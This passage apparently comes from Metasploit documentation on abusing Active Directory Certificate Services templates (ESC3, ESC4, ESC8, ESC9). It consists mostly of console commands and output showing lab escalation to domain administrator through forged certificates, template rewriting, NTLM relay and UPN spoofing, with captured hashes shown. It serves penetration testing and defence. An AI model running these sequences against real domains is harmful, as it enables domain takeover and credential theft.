   ALT_UPN                                        no        Alternative certificate UPN (format: USER@DOMAIN)
   CA             daforest-WIN-BR0CCBA815B-CA     yes       The target certificate authority
   CERT_TEMPLATE  ESC3-Template2                  yes       The certificate template
   ON_BEHALF_OF   DAFOREST\Administrator          no        Username to request on behalf of (format: DOMAIN\USE
                                                            R)
   PFX            /home/gwillcox/.msf4/loot/2022  no        Certificate to request on behalf of
                  1216174221_default_unknown_win
                  dows.ad.cs_027866.pfx
   RHOSTS         172.30.239.85                   yes       The target host(s), see https://github.com/rapid7/me
                                                            tasploit-framework/wiki/Using-Metasploit
   RPORT          445                             yes       The target port (TCP)
   SMBDomain      DAFOREST                        no        The Windows domain to use for authentication
   SMBPass        normalpass                      no        The password for the specified username
   SMBUser        normaluser                      no        The username to authenticate as


Auxiliary action:

   Name          Description
   ----          -----------
   REQUEST_CERT  Request a certificate



View the full module info with the info, or info -d command.

<span class="zp">msf</span> auxiliary<span class="p">(</span><span class="kc">admin/dcerpc/icpr_cert</span><span class="p">)</span> <span class="p">&gt;</span> run
<span class="zs">[*]</span> Running module against 172.30.239.85

<span class="zs">[*]</span> 172.30.239.85:445 - Requesting a certificate...
<span class="zg">[+]</span> 172.30.239.85:445 - The requested certificate was issued.
<span class="zs">[*]</span> 172.30.239.85:445 - Certificate UPN: Administrator@daforest.com
<span class="zs">[*]</span> 172.30.239.85:445 - Certificate SID: S-1-5-21-3290009963-1772292745-3260174523-500
<span class="zs">[*]</span> 172.30.239.85:445 - Certificate stored at: /home/gwillcox/.msf4/loot/20221216180342_default_unknown_windows.ad.cs_390825.pfx
<span class="zs">[*]</span> Auxiliary module execution completed
<span class="zp">msf</span> auxiliary<span class="p">(</span><span class="kc">admin/dcerpc/icpr_cert</span><span class="p">)</span> <span class="p">&gt;</span>
</code></pre></div></div><p>We can then use the <code class="language-plaintext highlighter-rouge">kerberos/get_ticket</code> module to gain a Kerberos ticket granting ticket (TGT) as the <code class="language-plaintext highlighter-rouge">Administrator</code> domain administrator. See the <a href="#getting-a-kerberos-ticket">Getting A Kerberos Ticket</a> section for more information.</p><h1 id="exploiting-esc4-to-gain-domain-administrator-privileges"> <a href="#exploiting-esc4-to-gain-domain-administrator-privileges" class="anchor-heading" aria-labelledby="exploiting-esc4-to-gain-domain-administrator-privileges"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Exploiting ESC4 To Gain Domain Administrator Privileges</h1><p>To exploit ESC4, we will require an account with write privileges over a certificate template object in Active Directory. This involves finding an object with weak permissions defined within the <code class="language-plaintext highlighter-rouge">nTSecurityDescriptor</code> field. With this object identified, we can modify it to reconfigure the template to be vulnerable to another ESC technique.</p><p>First, we will use the <code class="language-plaintext highlighter-rouge">icpr_cert</code> module in an attempt to exploit ESC1 (by setting <code class="language-plaintext highlighter-rouge">ALT_UPN</code>). This fails because the <code class="language-plaintext highlighter-rouge">ESC4-Test</code> certificate template does not allow the certificate’s subject name to be supplied in the request (the <code class="language-plaintext highlighter-rouge">CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT</code> flag is not set in the <code class="language-plaintext highlighter-rouge">msPKI-Certificate-Name-Flag</code> field).</p><div class="language-msf highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="zp">msf</span> <span class="p">&gt;</span> use auxiliary/admin/dcerpc/icpr_cert 
<span class="zp">msf</span> auxiliary<span class="p">(</span><span class="kc">admin/dcerpc/icpr_cert</span><span class="p">)</span> <span class="p">&gt;</span> set RHOSTS 172.30.239.85
RHOSTS =&gt; 172.30.239.85
<span class="zp">msf</span> auxiliary<span class="p">(</span><span class="kc">admin/dcerpc/icpr_cert</span><span class="p">)</span> <span class="p">&gt;</span> set SMBUser normaluser
SMBUser =&gt; normaluser
<span class="zp">msf</span> auxiliary<span class="p">(</span><span class="kc">admin/dcerpc/icpr_cert</span><span class="p">)</span> <span class="p">&gt;</span> set SMBPass normalpass
SMBPass =&gt; normalpass
<span class="zp">msf</span> auxiliary<span class="p">(</span><span class="kc">admin/dcerpc/icpr_cert</span><span class="p">)</span> <span class="p">&gt;</span> set CA daforest-WIN-BR0CCBA815B-CA
CA =&gt; daforest-WIN-BR0CCBA815B-CA
<span class="zp">msf</span> auxiliary<span class="p">(</span><span class="kc">admin/dcerpc/icpr_cert</span><span class="p">)</span> <span class="p">&gt;</span> set CERT_TEMPLATE ESC4-Test
CERT_TEMPLATE =&gt; ESC4-Test
<span class="zp">msf</span> auxiliary<span class="p">(</span><span class="kc">admin/dcerpc/icpr_cert</span><span class="p">)</span> <span class="p">&gt;</span> set ALT_UPN Administrator@daforest.com
ALT_UPN =&gt; Administrator@daforest.com
<span class="zp">msf</span> auxiliary<span class="p">(</span><span class="kc">admin/dcerpc/icpr_cert</span><span class="p">)</span> <span class="p">&gt;</span> run 
<span class="zs">[*]</span> Running module against 172.30.239.85

<span class="ze">[-]</span> 172.30.239.85:445 - There was an error while requesting the certificate.
<span class="ze">[-]</span> 172.30.239.85:445 - Denied by Policy Module
<span class="ze">[-]</span> 172.30.239.85:445 - Error details:
<span class="ze">[-]</span> 172.30.239.85:445 -   Source:  (0x0009) FACILITY_SECURITY: The source of the error code is the Security API layer.
<span class="ze">[-]</span> 172.30.239.85:445 -   HRESULT: (0x80094812) CERTSRV_E_SUBJECT_EMAIL_REQUIRED: The email name is unavailable and cannot be added to the Subject or Subject Alternate name.
<span class="zs">[*]</span> Auxiliary module execution completed
<span class="zp">msf</span> auxiliary<span class="p">(</span><span class="kc">admin/dcerpc/icpr_cert</span><span class="p">)</span> <span class="p">&gt;</span> 
</code></pre></div></div><p>Next, we use the <code class="language-plaintext highlighter-rouge">ad_cs_cert_template</code> module to update the <code class="language-plaintext highlighter-rouge">ESC4-Test</code> certificate template. This process first makes a backup of the certificate data that can be used later. Next, the local certificate template data is read and used to update the object in Active Directory. The local certificate template data can be modified to set a custom security descriptor.</p><div class="language-msf highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="zp">msf</span> auxiliary<span class="p">(</span><span class="kc">admin/dcerpc/icpr_cert</span><span class="p">)</span> <span class="p">&gt;</span> use auxiliary/admin/ldap/ad_cs_cert_template 
<span class="zp">msf</span> auxiliary<span class="p">(</span><span class="kc">admin/ldap/ad_cs_cert_template</span><span class="p">)</span> <span class="p">&gt;</span> set RHOSTS 172.30.239.85
RHOSTS =&gt; 172.30.239.85
<span class="zp">msf</span> auxiliary<span class="p">(</span><span class="kc">admin/ldap/ad_cs_cert_template</span><span class="p">)</span> <span class="p">&gt;</span> set USERNAME normaluser
USERNAME =&gt; normaluser
<span class="zp">msf</span> auxiliary<span class="p">(</span><span class="kc">admin/ldap/ad_cs_cert_template</span><span class="p">)</span> <span class="p">&gt;</span> set PASSWORD normalpass
PASSWORD =&gt; normalpass
<span class="zp">msf</span> auxiliary<span class="p">(</span><span class="kc">admin/ldap/ad_cs_cert_template</span><span class="p">)</span> <span class="p">&gt;</span> set CERT_TEMPLATE ESC4-Test
CERT_TEMPLATE =&gt; ESC4-Test
<span class="zp">msf</span> auxiliary<span class="p">(</span><span class="kc">admin/ldap/ad_cs_cert_template</span><span class="p">)</span> <span class="p">&gt;</span> set ACTION UPDATE 
ACTION =&gt; UPDATE
<span class="zp">msf</span> auxiliary<span class="p">(</span><span class="kc">admin/ldap/ad_cs_cert_template</span><span class="p">)</span> <span class="p">&gt;</span> set VERBOSE true 
VERBOSE =&gt; true
<span class="zp">msf</span> auxiliary<span class="p">(</span><span class="kc">admin/ldap/ad_cs_cert_template</span><span class="p">)</span> <span class="p">&gt;</span> run
<span class="zs">[*]</span> Running module against 172.30.239.85

<span class="zg">[+]</span> Successfully bound to the LDAP server!
<span class="zs">[*]</span> Discovering base DN automatically
<span class="zs">[*]</span> 172.30.239.85:389 Getting root DSE
<span class="zg">[+]</span> 172.30.239.85:389 Discovered base DN: DC=daforest,DC=com
<span class="zg">[+]</span> Read certificate template data for: CN=ESC4-Test,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=daforest,DC=com
<span class="zs">[*]</span> Certificate template data written to: /home/smcintyre/.msf4/loot/20230505083802_default_172.30.239.85_windows.ad.cs.te_593597.json
<span class="zs">[*]</span> Parsing SDDL text: D:PAI(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;AU)
<span class="zg">[+]</span> The operation completed successfully!
<span class="zs">[*]</span> Auxiliary module execution completed
<span class="zp">msf</span> auxiliary<span class="p">(</span><span class="kc">admin/ldap/ad_cs_cert_template</span><span class="p">)</span> <span class="p">&gt;</span> 
</code></pre></div></div><p>Now that the certificate template has been updated to be vulnerable to ESC1, then we can use the <code class="language-plaintext highlighter-rouge">previous</code> shortcut to switch back to the last module and reattempt to issue the certificate. This time, the operation succeeds.</p><div class="language-msf highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="zp">msf</span> auxiliary<span class="p">(</span><span class="kc">admin/ldap/ad_cs_cert_template</span><span class="p">)</span> <span class="p">&gt;</span> previous 
<span class="zp">msf</span> auxiliary<span class="p">(</span><span class="kc">admin/dcerpc/icpr_cert</span><span class="p">)</span> <span class="p">&gt;</span> run
<span class="zs">[*]</span> Running module against 172.30.239.85

<span class="zg">[+]</span> 172.30.239.85:445 - The requested certificate was issued.
<span class="zs">[*]</span> 172.30.239.85:445 - Certificate UPN: Administrator@daforest.com
<span class="zs">[*]</span> 172.30.239.85:445 - Certificate stored at: /home/smcintyre/.msf4/loot/20230505083913_default_172.30.239.85_windows.ad.cs_275324.pfx
<span class="zs">[*]</span> Auxiliary module execution completed
<span class="zp">msf</span> auxiliary<span class="p">(</span><span class="kc">admin/dcerpc/icpr_cert</span><span class="p">)</span> <span class="p">&gt;</span> 
</code></pre></div></div><p>Finally, we switch back to the <code class="language-plaintext highlighter-rouge">ad_cs_cert_template</code> module to restore the original configuration. We do this by setting the local template data option <code class="language-plaintext highlighter-rouge">TEMPLATE_FILE</code> to the JSON file that was created by the previous run.</p><div class="language-msf highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="zp">msf</span> auxiliary<span class="p">(</span><span class="kc">admin/dcerpc/icpr_cert</span><span class="p">)</span> <span class="p">&gt;</span> previous 
<span class="zp">msf</span> auxiliary<span class="p">(</span><span class="kc">admin/ldap/ad_cs_cert_template</span><span class="p">)</span> <span class="p">&gt;</span> set TEMPLATE_FILE /home/smcintyre/.msf4/loot/20230505083802_default_172.30.239.85_windows.ad.cs.te_593597.json
TEMPLATE_FILE =&gt; /home/smcintyre/.msf4/loot/20230505083802_default_172.30.239.85_windows.ad.cs.te_593597.json
<span class="zp">msf</span> auxiliary<span class="p">(</span><span class="kc">admin/ldap/ad_cs_cert_template</span><span class="p">)</span> <span class="p">&gt;</span> run
<span class="zs">[*]</span> Running module against 172.30.239.85

<span class="zg">[+]</span> Successfully bound to the LDAP server!
<span class="zs">[*]</span> Discovering base DN automatically
<span class="zs">[*]</span> 172.30.239.85:389 Getting root DSE
<span class="zg">[+]</span> 172.30.239.85:389 Discovered base DN: DC=daforest,DC=com
<span class="zg">[+]</span> Read certificate template data for: CN=ESC4-Test,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=daforest,DC=com
<span class="zs">[*]</span> Certificate template data written to: /home/smcintyre/.msf4/loot/20230505083942_default_172.30.239.85_windows.ad.cs.te_000095.json
<span class="zg">[+]</span> The operation completed successfully!
<span class="zs">[*]</span> Auxiliary module execution completed
<span class="zp">msf</span> auxiliary<span class="p">(</span><span class="kc">admin/ldap/ad_cs_cert_template</span><span class="p">)</span> <span class="p">&gt;</span>
</code></pre></div></div><p>At this point the certificate template’s configuration has been restored and the operator has a certificate that can be used to authenticate to Active Directory as the Domain Admin.</p><h1 id="exploiting-esc8"> <a href="#exploiting-esc8" class="anchor-heading" aria-labelledby="exploiting-esc8"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Exploiting ESC8</h1><p>ESC8 leverages relaying NTLM authentication from an SMB server (running on Metasploit) to the HTTP(S) AD CS Web Enrollment portal running on a remote target. The attacker will need to coerce a client with privileges to authenticate to the target portal to authenticate to Metasploit instead. This can be achieved via a few techniques, including name poisoning via the <code class="language-plaintext highlighter-rouge">capture</code> plugin, coercion via the <code class="language-plaintext highlighter-rouge">auxiliary/scanner/dcerpc/petitpotam</code> module, or even a well placed UNC path. Once authentication has been relayed and an authorized HTTP session has been established, the attacker can query available certificate templates as well as issue them.</p><p>Exploitation of this flaw is facilitated through the <code class="language-plaintext highlighter-rouge">auxiliary/server/relay/esc8</code> module which handles starting the SMB relay server and enables configuration of what happens when relaying is successful. Users can select from different operational “modes” via the MODE datastore option which controls what the module will do. For a full description, see the modules documentation. The default mode, “AUTO” will issue a User certificate if the relayed connection is for a user account or a Machine certificate if it’s for a machine account. Once this certificate has been issued, it can be used for authentication. See the <a href="#authenticating-with-a-certificate">Authenticating With A Certificate</a> section for more information.</p><p>In the following example the AUTO mode is used to issue a certificate for the MSFLAB\smcintyre once they have authenticated.</p><div class="language-msf highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="zp">msf</span> auxiliary<span class="p">(</span><span class="kc">server/relay/esc8</span><span class="p">)</span> <span class="p">&gt;</span> set RHOSTS 172.30.239.85
<span class="zp">msf</span> auxiliary<span class="p">(</span><span class="kc">server/relay/esc8</span><span class="p">)</span> <span class="p">&gt;</span> run
<span class="zs">[*]</span> Auxiliary module running as background job 1.
<span class="zp">msf</span> auxiliary<span class="p">(</span><span class="kc">server/relay/esc8</span><span class="p">)</span> <span class="p">&gt;</span> 
<span class="zs">[*]</span> SMB Server is running. Listening on 0.0.0.0:445
<span class="zs">[*]</span> Server started.
<span class="zs">[*]</span> New request from 192.168.159.129
<span class="zs">[*]</span> Received request for MSFLAB\smcintyre
<span class="zs">[*]</span> Relaying to next target http://172.30.239.85:80/certsrv/
<span class="zg">[+]</span> Identity: MSFLAB\smcintyre - Successfully authenticated against relay target http://172.30.239.85:80/certsrv/
[SMB] NTLMv2-SSP Client     : 172.30.239.85
[SMB] NTLMv2-SSP Username   : MSFLAB\smcintyre
[SMB] NTLMv2-SSP Hash       : smcintyre::MSFLAB:821ad4c6b40475f4:07a6e0fd89d9af86a5b0e12d24915b4d:010100000000000071fe99aa0a27db01eabcbc6e8fcb6ed20000000002000c004d00530046004c00410042000100040044004300040018006d00730066006c00610062002e006c006f00630061006c0003001e00440043002e006d00730066006c00610062002e006c006f00630061006c00050018006d00730066006c00610062002e006c006f00630061006c000700080071fe99aa0a27db01060004000200000008003000300000000000000001000000002000004206ecc9e398d7766166f0f45d8bdcf7708c8f278f2cff1cc58017f9acf0f5400a001000000000000000000000000000000000000900280063006900660073002f003100390032002e003100360038002e003100350039002e003100320038000000000000000000

<span class="zs">[*]</span> Creating certificate request for MSFLAB\smcintyre using the User template
<span class="zs">[*]</span> Generating CSR...
<span class="zs">[*]</span> CSR Generated
<span class="zs">[*]</span> Requesting relay target generate certificate...
<span class="zg">[+]</span> Certificate generated using template User and MSFLAB\smcintyre
<span class="zs">[*]</span> Attempting to download the certificate from /certsrv/certnew.cer?ReqID=184&amp;
<span class="zg">[+]</span> Certificate for MSFLAB\smcintyre using template User saved to /home/smcintyre/.msf4/loot/20241025142116_default_172.30.239.85_windows.ad.cs_995918.pfx
<span class="zs">[*]</span> Relay tasks complete; waiting for next login attempt.
<span class="zs">[*]</span> Received request for MSFLAB\smcintyre
<span class="zs">[*]</span> Identity: MSFLAB\smcintyre - All targets relayed to
<span class="zs">[*]</span> New request from 192.168.159.129
<span class="zs">[*]</span> Received request for MSFLAB\smcintyre
<span class="zs">[*]</span> Identity: MSFLAB\smcintyre - All targets relayed to
</code></pre></div></div><h1 id="overview-of-exploiting-esc9-and-esc10-with-metasploit"> <a href="#overview-of-exploiting-esc9-and-esc10-with-metasploit" class="anchor-heading" aria-labelledby="overview-of-exploiting-esc9-and-esc10-with-metasploit"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Overview of exploiting ESC9 and ESC10 with Metasploit</h1><p>ESC9 and ESC10 are similar certificate misconfiguration abuse techniques. They both involve having credentials of a user, say “user1”, who has GenericWrite privileges over “user2”. This allows an attacker as “user1” to update either the <code class="language-plaintext highlighter-rouge">userPrincipalName</code> or <code class="language-plaintext highlighter-rouge">dNSHostName</code> attribute of “user2”. In order to update the attribute, we need to authenticate via LDAP - which is a unique requirement compared to the other ESC techniques and is why there is a separated module called <code class="language-plaintext highlighter-rouge">esc_update_ldap_object</code> which combines the attribute update via LDAP and certificate issuance process.</p><p>If the AD CS server is configured to allow “weak certificate mappings” when a user is requesting a certificate, the server will check the <code class="language-plaintext highlighter-rouge">userPrincipalName</code> or the <code class="language-plaintext highlighter-rouge">dNSHostName</code> of the requesting identity and then issue a certificate based on that value. Therefore if we can update “user2”’s UPN to “Administrator” and then request a certificate on behalf of “user2” we can get an Administrator certificate (easy priv esc horay). That is the essence of both ESC9 and ESC10 minus a number of details we’ll get into.</p><p>It’s also worth noting that the following registry keys and preventative measure and exploit techniques (ESC9 and 10) all stem from Microsoft attempts to patch CVE-2022–26923 (aka Certifried). During this effort they implemented the new <code class="language-plaintext highlighter-rouge">szOID_NTDS_CA_SECURITY_EXT</code> security extension for issued certificates, which will embed the <code class="language-plaintext highlighter-rouge">objectSid</code> property of the requester, to help facilitate “strong certificate mappings”, along with the following registry keys and certificate template flags.</p><h2 id="strongcertificatebindingenforcement"> <a href="#strongcertificatebindingenforcement" class="anchor-heading" aria-labelledby="strongcertificatebindingenforcement"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> StrongCertificateBindingEnforcement</h2><p>Located in: <code class="language-plaintext highlighter-rouge">HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Kdc</code></p><p>This registry key defines what is considered weak and strong certificate mappings for <strong>Kerberos authentication</strong>. Possible values:</p><div class="table-wrapper"><table><thead><tr><th>Setting<th>Method<th>Strength assessment<tbody><tr><td>0<td>No strong certificate mapping checks are done<td>weak<tr><td>1<td>Will use strong mapping if present though can be ignored if CT_FLAG_NO_SECURITY_EXTENSION is set<td>weak<tr><td>2<td>Full Enforcement Mode (No weak mappings allowed)<td>strong</table></div><p>In order to exploit these certificate misconfiguration we will need the value of <code class="language-plaintext highlighter-rouge">StrongCertificateBindingEnforcement</code> to be either <code class="language-plaintext highlighter-rouge">0</code> or <code class="language-plaintext highlighter-rouge">1</code>. If the value is set to <code class="language-plaintext highlighter-rouge">2</code> we cannot exploit the misconfiguration using Kerberos authentication.</p><h2 id="certificatemappingmethods"> <a href="#certificatemappingmethods" class="anchor-heading" aria-labelledby="certificatemappingmethods"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> CertificateMappingMethods</h2><p>Located in: <code class="language-plaintext highlighter-rouge">HKLM\System\CurrentControlSet\Control\SecurityProviders\Schannel</code></p><p>This registry key defines what is considered weak and strong certificate mappings for <strong>Schannel authentication</strong>. Possible values:</p><div class="table-wrapper"><table><thead><tr><th>Bit<th>Setting<th>Method<th>Strength assessment<tbody><tr><td>1<td>0x0001<td>Subject/Issuer certificate mapping<td>weak<tr><td>2<td>0x0002<td>Issuer certificate mapping<td>weak<tr><td>3<td>0x0004<td>UPN certificate mapping<td>weak<tr><td>4<td>0x0008<td>S4U2Self certificate mapping<td>strong<tr><td>5<td>0x0010<td>S4U2Self explicit certificate mapping<td>strong<tr><td>1-5<td>0x001F<td>All of the above values<td>weak</table></div><p>In order to exploit these certificate misconfiguration using Schannel authentication we will need the value of <code class="language-plaintext highlighter-rouge">CertificateMappingMethods</code> to be <code class="language-plaintext highlighter-rouge">UPN certificate mapping</code> (or <code class="language-plaintext highlighter-rouge">All the above values</code>)</p><h2 id="ct_flag_no_security_extension"> <a href="#ct_flag_no_security_extension" class="anchor-heading" aria-labelledby="ct_flag_no_security_extension"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> CT_FLAG_NO_SECURITY_EXTENSION</h2><p>Certificate templates now include an attribute called <code class="language-plaintext highlighter-rouge">msPKI-Enrollment-Flag</code>. The <code class="language-plaintext highlighter-rouge">msPKI-Enrollment-Flag</code> attribute defines how certificate enrollment behaves by enabling or disabling specific behaviors via a bitmask of flags. If the attribute contains the value:<code class="language-plaintext highlighter-rouge">0x00080000</code> (aka <code class="language-plaintext highlighter-rouge">CT_FLAG_NO_SECURITY_EXTENSION</code>) then the <code class="language-plaintext highlighter-rouge">szOID_NTDS_CA_SECURITY_EXT</code> is not included and we can exploit weak certificate mappings even if <code class="language-plaintext highlighter-rouge">StrongCertificateBindingEnforcement</code> is set to 1.</p><h2 id="changing-userprincipalname-vs-dnshostname"> <a href="#changing-userprincipalname-vs-dnshostname" class="anchor-heading" aria-labelledby="changing-userprincipalname-vs-dnshostname"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Changing userPrincipalName vs dNSHostName</h2><p>Both can be used to exploit the certificate misconfiguration. It should be noted that normal users don’t have a <code class="language-plaintext highlighter-rouge">dNSHostName</code> attribute, only machine accounts do.</p><h1 id="exploiting-esc9"> <a href="#exploiting-esc9" class="anchor-heading" aria-labelledby="exploiting-esc9"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Exploiting ESC9</h1><h2 id="esc9-scenario-1"> <a href="#esc9-scenario-1" class="anchor-heading" aria-labelledby="esc9-scenario-1"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> ESC9 Scenario 1</h2><p>Pre-requisites:</p><ul><li><code class="language-plaintext highlighter-rouge">StrongCertificateBindingEnforcement</code> is set to <code class="language-plaintext highlighter-rouge">1</code> (if it’s set to <code class="language-plaintext highlighter-rouge">0</code> exploitation will still work but technically you’re exploiting ESC10 in that case)<li>A vulnerable certificate template has the <code class="language-plaintext highlighter-rouge">CT_FLAG_NO_SECURITY_EXTENSION</code> flag set.<li>The same vulnerable template has the <code class="language-plaintext highlighter-rouge">SubjectAltRequireUPN</code> flag set.<li>The same vulnerable template has a client authentication EKU<li>We have credentials of a user who has <code class="language-plaintext highlighter-rouge">GenericWrite</code> privileges over another user that can enroll in the vulnerable template</ul><div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msf6 auxiliary(gather/ldap_esc_vulnerable_cert_finder) &gt; run
...
[+] Template: ESC9-Template
[*]   Distinguished Name: CN=ESC9-Template,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=kerberos,DC=issue
[*]   Manager Approval: Disabled
[*]   Required Signatures: 0
[!]   Potentially vulnerable to: ESC9 (the template is in a vulnerable configuration but in order to exploit registry key StrongCertificateBindingEnforcement must not be set to 2)
[*]   Notes:
[*]     * ESC9: Template has msPKI-Enrollment-Flag set to 0x80000 (CT_FLAG_NO_SECURITY_EXTENSION) and specifies a client authentication EKU and user1 has write privileges over user2 and the template has a subjectAltName (UPN or DNS) requirement
[*]  Certificate Template Write-Enabled SIDs:
[*]     * S-1-5-21-2324486357-3075865580-3606784161-1602 (user1)
[*]     * S-1-5-21-2324486357-3075865580-3606784161-1603 (user2)
[*]     * S-1-5-11 (Authenticated Users)
[*]   Certificate Template Enrollment SIDs:
[*]     * S-1-5-21-2324486357-3075865580-3606784161-1602 (user1)
[*]     * S-1-5-21-2324486357-3075865580-3606784161-1603 (user2)
[*]     * S-1-5-11 (Authenticated Users)
...
</code></pre></div></div><p>Now we can see the above template is possibly exploitable if the <code class="language-plaintext highlighter-rouge">StrongCertificateBindingEnforcement</code> is set to <code class="language-plaintext highlighter-rouge">1</code>. In our case it is so we can proceed with exploitation.</p><p>We will set a number of datastore options in order to exploit ESC9 in this scenario. We will set <code class="language-plaintext highlighter-rouge">RHOSTS</code>, <code class="language-plaintext highlighter-rouge">CERT_TEMPLATE</code>, and <code class="language-plaintext highlighter-rouge">CA</code> as we normally would. In order to update the UPN of the target user we must connect to LDAP and so the datastore options <code class="language-plaintext highlighter-rouge">LDAPUsername</code>, <code class="language-plaintext highlighter-rouge">LDAPPassword</code>, and <code class="language-plaintext highlighter-rouge">LDAPDomain</code> are the credentials of the user who has <code class="language-plaintext highlighter-rouge">GenericWrite</code> privileges over the <code class="language-plaintext highlighter-rouge">TARGET_USERNAME</code>. Note <code class="language-plaintext highlighter-rouge">LDAPRport</code> must be set in order to connect however it defaults to 389.</p><p>The option <code class="language-plaintext highlighter-rouge">UPDATE_LDAP_OBJECT</code> is an enum that can be set to either <code class="language-plaintext highlighter-rouge">userPrincipalName</code> or <code class="language-plaintext highlighter-rouge">dNSHostName</code> and must be set in order to instruct the module to attempt to exploit ESC9 or ESC10. We will set <code class="language-plaintext highlighter-rouge">UPDATE_LDAP_OBJECT</code> to <code class="language-plaintext highlighter-rouge">userPrincipalName</code> in this case and so we then must set <code class="language-plaintext highlighter-rouge">UPDATE_LDAP_OBJECT_VALUE</code> to <code class="language-plaintext highlighter-rouge">Administrator</code>.</p><p>It’s important for this scenario, when updating the UPN to omit the domain suffix from the UPN to avoid conflicts with other UPNs in the domain, which by default all contain the suffix. The UPN processing order will still allow the DC to map the UPN Administrator in our writable account to the actual administrator, making its impersonation possible.</p><p>It’s also important to note that after issuing the certificate we must revert the <code class="language-plaintext highlighter-rouge">userPrincipalName</code> of the <code class="language-plaintext highlighter-rouge">TARGET_USERNAME</code> back to the original value before attempting to use the certificate or the certificate will not work. This is done automatically by the module.</p><p>In the following example, the ESC9-Template template is vulnerable to ESC9 and will yield a ticket for Administrator once complete.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msf6 auxiliary(admin/dcerpc/esc_update_ldap_object) &gt; set rhosts 172.16.199.200
rhosts =&gt; 172.16.199.200
msf6 auxiliary(admin/dcerpc/esc_update_ldap_object) &gt; set ldaprport 389
ldaprport =&gt; 389
msf6 auxiliary(admin/dcerpc/esc_update_ldap_object) &gt; set target_username user2
target_username =&gt; user2
msf6 auxiliary(admin/dcerpc/esc_update_ldap_object) &gt; set ldapdomain kerberos.issue
ldapdomain =&gt; kerberos.issue
msf6 auxiliary(admin/dcerpc/esc_update_ldap_object) &gt; set ldappassword N0tpassword!
ldappassword =&gt; N0tpassword!
msf6 auxiliary(admin/dcerpc/esc_update_ldap_object) &gt; set ldapusername user1
ldapusername =&gt; user1
msf6 auxiliary(admin/dcerpc/esc_update_ldap_object) &gt; set cert_template ESC9-Template
cert_template =&gt; SpencerTest
msf6 auxiliary(admin/dcerpc/esc_update_ldap_object) &gt; set ca kerberos-DC2-CA
ca =&gt; kerberos-DC2-CA
msf6 auxiliary(admin/dcerpc/esc_update_ldap_object) &gt; set UPDATE_LDAP_OBJECT_VALUE Administrator
UPDATE_LDAP_OBJECT_VALUE =&gt; Administrator
msf6 auxiliary(admin/dcerpc/esc_update_ldap_object) &gt; run
[*] Running module against 172.16.199.200
[*] 172.16.199.200:445 - Loading auxiliary/admin/ldap/ldap_object_attribute
[*] 172.16.199.200:445 - Running auxiliary/admin/ldap/ldap_object_attribute
[*] New in Metasploit 6.4 - This module can target a SESSION or an RHOST
[*] Current value of user2's userPrincipalName: user2
[*] Attempting to update userPrincipalName for CN=user2,CN=Users,DC=kerberos,DC=issue to Administrator...
[+] Successfully updated CN=user2,CN=Users,DC=kerberos,DC=issue's userPrincipalName to Administrator
[+] The operation completed successfully!
[*] 172.16.199.200:445 - Adding shadow credentials for user2
[*] 172.16.199.200:445 - Loading admin/ldap/shadow_credentials
[*] 172.16.199.200:445 - Running admin/ldap/shadow_credentials
[*] New in Metasploit 6.4 - This module can target a SESSION or an RHOST
[*] Discovering base DN automatically
[*] 172.16.199.200:389 Discovered base DN: DC=kerberos,DC=issue
[*] Certificate stored at: /Users/jheysel/.msf4/loot/20250717140905_default_172.16.199.200_windows.ad.cs_563081.pfx
[+] Successfully updated the msDS-KeyCredentialLink attribute; certificate with device ID 2ff08c15-0ab3-98ad-ee0b-3fd1fbcf3e9d
[*] 172.16.199.200:445 - Loading admin/kerberos/get_ticket
[*] 172.16.199.200:445 - Getting hash for user2
[!] Warning: Provided principal and realm (user2@kerberos.issue) do not match entries in certificate:
[+] 172.16.199.200:88 - Received a valid TGT-Response
[*] 172.16.199.200:88 - TGT MIT Credential Cache ticket saved to /Users/jheysel/.msf4/loot/20250717140905_default_172.16.199.200_mit.kerberos.cca_263627.bin
[*] 172.16.199.200:88 - Getting NTLM hash for user2@kerberos.issue
[+] 172.16.199.200:88 - Received a valid TGS-Response
[*] 172.16.199.200:88 - TGS MIT Credential Cache ticket saved to /Users/jheysel/.msf4/loot/20250717140905_default_172.16.199.200_mit.kerberos.cca_015140.bin
[+] Found NTLM hash for user2: aad3b435b51404eeaad3b435b51404ee:4fd408d8f8ecb20d4b0768a0ac44b71f
[+] 172.16.199.200:445 - The requested certificate was issued.
[*] 172.16.199.200:445 - Certificate Policies:
[*] 172.16.199.200:445 -   * 1.3.6.1.5.5.7.3.2 (Client Authentication)
[*] 172.16.199.200:445 - Certificate UPN: Administrator
[*] 172.16.199.200:445 - Certificate stored at: /Users/jheysel/.msf4/loot/20250717140907_default_172.16.199.200_windows.ad.cs_548728.pfx
[*] 172.16.199.200:445 - reverting ldap object
[*] 172.16.199.200:445 - Loading admin/ldap/shadow_credentials
[*] 172.16.199.200:445 - Running admin/ldap/shadow_credentials
[*] New in Metasploit 6.4 - This module can target a SESSION or an RHOST
[*] Discovering base DN automatically
[*] 172.16.199.200:389 Discovered base DN: DC=kerberos,DC=issue
[*] No matching entries found - check device ID
